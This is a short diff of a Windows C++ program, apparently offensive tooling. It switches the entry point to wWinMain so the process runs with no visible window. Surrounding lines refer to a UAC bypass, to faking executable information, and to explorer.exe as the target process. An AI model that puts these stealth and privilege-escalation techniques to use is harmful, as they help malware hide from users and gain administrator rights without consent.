@@ -34,10 +34,14 @@ NTSTATUS StartProcessAsAdmin(LPWSTR lpName);
 #define		MY_PROC		"explorer.exe"
 #endif
 
-int main() {
-
-	//Hide console as first thing to do
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+//WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+    _In_opt_ HINSTANCE hPrevInstance,
+    _In_ LPWSTR    lpCmdLine,
+    _In_ int       nCmdShow)
+{
+    UNREFERENCED_PARAMETER(hPrevInstance);
+    UNREFERENCED_PARAMETER(lpCmdLine);
 
 	//Must be called before calling UAC bypass due to it manipulating/faking executable information
 	auto cwd = GetCWD();
